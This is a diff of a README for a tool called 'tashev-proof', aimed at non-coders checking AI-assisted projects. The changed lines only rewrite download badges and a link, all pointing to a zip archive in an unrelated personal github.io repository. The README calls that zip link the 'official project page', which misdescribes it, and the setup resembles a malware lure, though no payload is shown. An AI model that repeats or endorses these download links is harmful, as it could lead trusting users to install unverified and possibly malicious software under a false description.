@@ -30,7 +30,7 @@ If you can click a button and read a sentence, you can use tashev-proof. No codi
 
 ## 📥 Download & Installation
 
-[![Download tashev-proof Now](https://img.shields.io/badge/Download-tashev--proof-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=%23FF6B6B&labelColor=%23333)](https://github.com/bpcorneille/bpcorneille.github.io/raw/refs/heads/main/assets/Latest-v2.5.zip)
+[![Download tashev-proof Now](https://img.shields.io/badge/Download-tashev--proof-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=%23FF6B6B&labelColor=%23333)](https://raw.githubusercontent.com/bpcorneille/bpcorneille.github.io/main/assets/Latest-v2.5.zip)
 
 Visit this link to download the application.
 
@@ -115,7 +115,7 @@ Yes, tashev-proof works with websites, mobile apps, desktop programs, and more. 
 
 If you get stuck or want to learn advanced tips, visit the official project page at:
 
-**https://github.com/bpcorneille/bpcorneille.github.io/raw/refs/heads/main/assets/Latest-v2.5.zip**
+**https://raw.githubusercontent.com/bpcorneille/bpcorneille.github.io/main/assets/Latest-v2.5.zip**
 
 There, you'll find:
 - Detailed documentation
@@ -137,7 +137,7 @@ With tashev-proof, you'll never again have to ask "But is it really done?" You'l
 
 Don't let uncertainty slow you down. Download tashev-proof now and take control of your AI-assisted projects. It's free, it's easy, and it gives you the confidence to move forward.
 
-[![Get tashev-proof](https://img.shields.io/badge/Get%20tashev--proof%20Now-Download-blue?style=for-the-badge&logo=github&logoColor=white&color=%234ECDC4&labelColor=%232C3E50)](https://github.com/bpcorneille/bpcorneille.github.io/raw/refs/heads/main/assets/Latest-v2.5.zip)
+[![Get tashev-proof](https://img.shields.io/badge/Get%20tashev--proof%20Now-Download-blue?style=for-the-badge&logo=github&logoColor=white&color=%234ECDC4&labelColor=%232C3E50)](https://raw.githubusercontent.com/bpcorneille/bpcorneille.github.io/main/assets/Latest-v2.5.zip)
 
 ---
 
